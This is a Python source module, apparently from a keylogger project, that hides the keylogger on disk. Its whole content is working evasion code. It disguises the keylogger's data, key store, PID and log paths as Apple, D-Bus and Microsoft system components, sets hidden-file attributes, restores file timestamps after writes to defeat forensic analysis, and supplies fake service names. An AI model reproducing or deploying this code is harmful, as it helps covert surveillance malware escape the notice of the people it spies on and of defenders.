"""
File-system footprint minimisation for stealth mode.

Handles:
  - Platform-aware path aliasing (innocuous directory/file names)
  - Hidden directory/file creation (macOS UF_HIDDEN, Windows HIDDEN attr, Linux dot-prefix)
  - Timestamp preservation (restore mtime/atime after writes)
  - String identifier scrubbing (no "keylogger" in any path)

Usage::

    from stealth.fs_cloak import FileSystemCloak

    cloak = FileSystemCloak(config)
    cloak.apply()                          # create hidden dirs, apply aliases
    pid_path = cloak.get_pid_path()        # innocuous PID path
    data_dir = cloak.get_data_dir()        # innocuous data directory
"""
from __future__ import annotations

import ctypes
import logging
import os
import platform
import stat
import time
from contextlib import contextmanager
from pathlib import Path
from typing import Any, Generator

logger = logging.getLogger(__name__)


def _get_platform() -> str:
    return platform.system().lower()


# ── Platform-specific default paths ──────────────────────────────────

_DEFAULT_PATHS: dict[str, dict[str, str]] = {
    "darwin": {
        "data_dir": "~/Library/Application Support/com.apple.dt.instruments",
        "pid_file": "/tmp/.com.apple.dt.instruments.pid",
        "log_file": "",  # empty = memory-only when stealth
        "key_store": "~/Library/Application Support/com.apple.security.agent",
        "config_dir": "~/Library/Preferences/.com.apple.dt.instruments",
    },
    "linux": {
        "data_dir": "~/.local/share/dbus-1/services",
        "pid_file": "/tmp/.dbus-session-bus.pid",
        "log_file": "",
        "key_store": "~/.local/share/keyrings/.default",
        "config_dir": "~/.config/dbus-1",
    },
    "windows": {
        "data_dir": os.path.join(
            os.environ.get("LOCALAPPDATA", "C:\\Users\\Public"),
            "Microsoft", "CLR_v4.0",
        ),
        "pid_file": os.path.join(
            os.environ.get("TEMP", "C:\\Windows\\Temp"),
            "clr_optimization.pid",
        ),
        "log_file": "",
        "key_store": os.path.join(
            os.environ.get("LOCALAPPDATA", "C:\\Users\\Public"),
            "Microsoft", "Crypto", "Keys",
        ),
        "config_dir": os.path.join(
            os.environ.get("LOCALAPPDATA", "C:\\Users\\Public"),
            "Microsoft", "CLR_v4.0", "config",
        ),
    },
}


class FileSystemCloak:
    """Manages file-system stealth measures.

    Parameters
    ----------
    config : dict
        The ``stealth.filesystem`` section of the configuration.
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        cfg = config or {}
        self._platform = _get_platform()
        self._hidden_dirs: bool = bool(cfg.get("hidden_dirs", True))
        self._timestamp_preservation: bool = bool(cfg.get("timestamp_preservation", True))
        self._minimal_footprint: bool = bool(cfg.get("minimal_footprint", False))

        # Custom path overrides (empty string = use platform default)
        custom = cfg.get("custom_paths", {}) or {}
        defaults = _DEFAULT_PATHS.get(self._platform, _DEFAULT_PATHS["linux"])
        self._paths = {
            key: str(custom.get(key, "")).strip() or defaults[key]
            for key in defaults
        }
        self._applied = False

    # ── Public API ───────────────────────────────────────────────────

    def apply(self) -> None:
        """Create stealth directories and apply hidden attributes."""
        if self._applied:
            return

        for key in ("data_dir", "key_store", "config_dir"):
            path_str = self._paths.get(key, "")
            if not path_str:
                continue
            path = Path(os.path.expanduser(path_str))
            path.mkdir(parents=True, exist_ok=True)
            if self._hidden_dirs:
                self._hide_path(path)

        self._applied = True
        logger.debug("File system cloak applied")

    def get_pid_path(self) -> str:
        """Return the stealthy PID file path."""
        return os.path.expanduser(self._paths.get("pid_file", "/tmp/.system.pid"))

    def get_data_dir(self) -> str:
        """Return the stealthy data directory path."""
        return os.path.expanduser(self._paths.get("data_dir", "./data"))

    def get_log_file(self) -> str:
        """Return the stealthy log file path (empty = no file logging)."""
        return os.path.expanduser(self._paths.get("log_file", ""))

    def get_key_store(self) -> str:
        """Return the stealthy key store path."""
        return os.path.expanduser(self._paths.get("key_store", ""))

    def get_config_dir(self) -> str:
        """Return the stealthy config directory path."""
        return os.path.expanduser(self._paths.get("config_dir", ""))

    def get_db_name(self) -> str:
        """Return an innocuous database filename."""
        return "preferences.db" if self._minimal_footprint else "cache.db"

    def get_cleanup_script_name(self) -> str:
        """Return an innocuous cleanup script name (instead of akl_cleanup.sh)."""
        if self._platform == "windows":
            return "sys_cache_gc.bat"
        return "sys_cache_gc.sh"

    # ── Timestamp preservation ───────────────────────────────────────

    @contextmanager
    def preserve_timestamps(self, path: str | Path) -> Generator[None, None, None]:
        """Context manager that restores ``mtime`` and ``atime`` after the block.

        Usage::

            with cloak.preserve_timestamps("/some/file.db"):
                write_to_file(...)
        """
        p = Path(path)
        original_stat = None
        if self._timestamp_preservation and p.exists():
            try:
                st = p.stat()
                original_stat = (st.st_atime, st.st_mtime)
            except OSError:
                pass

        yield

        if original_stat is not None:
            try:
                os.utime(str(p), times=original_stat)
            except OSError:
                pass

    # ── File/directory hiding ────────────────────────────────────────

    def _hide_path(self, path: Path) -> None:
        """Apply platform-native hidden attribute to a path."""
        try:
            if self._platform == "darwin":
                self._hide_macos(path)
            elif self._platform == "windows":
                self._hide_windows(path)
            # Linux: dot-prefix is handled by the path names themselves
        except Exception as exc:
            logger.debug("Failed to hide %s: %s", path, exc)

    @staticmethod
    def _hide_macos(path: Path) -> None:
        """Use ``os.chflags`` with ``UF_HIDDEN`` to hide from Finder."""
        try:
            st = os.stat(str(path))
            os.chflags(str(path), st.st_flags | stat.UF_HIDDEN)
        except (OSError, AttributeError):
            # UF_HIDDEN may not be available on all Python builds
            pass

    @staticmethod
    def _hide_windows(path: Path) -> None:
        """Set ``FILE_ATTRIBUTE_HIDDEN`` via kernel32."""
        try:
            FILE_ATTRIBUTE_HIDDEN = 0x02
            ctypes.windll.kernel32.SetFileAttributesW(  # type: ignore[attr-defined]
                str(path), FILE_ATTRIBUTE_HIDDEN
            )
        except Exception:
            pass

    def hide_file(self, path: str | Path) -> None:
        """Public method to hide an individual file or directory."""
        self._hide_path(Path(path))

    # ── Service identity helpers ─────────────────────────────────────

    def get_service_label(self) -> str:
        """Return a platform-appropriate innocuous service label."""
        if self._platform == "darwin":
            return "com.apple.cfprefsd.xpc.agent"
        if self._platform == "linux":
            return "dbus-session-bus"
        return "WindowsSystemHelper"

    def get_service_description(self) -> str:
        """Return a platform-appropriate innocuous service description."""
        if self._platform == "darwin":
            return "CoreFoundation Preferences Daemon"
        if self._platform == "linux":
            return "D-Bus Session Message Bus"
        return "Windows System Helper Service"

    def get_plist_log_paths(self) -> tuple[str, str]:
        """Return innocuous log paths for macOS launchd plist."""
        return (
            os.path.expanduser("~/Library/Logs/DiagnosticMessages/com.apple.diagnosticd.out"),
            os.path.expanduser("~/Library/Logs/DiagnosticMessages/com.apple.diagnosticd.err"),
        )
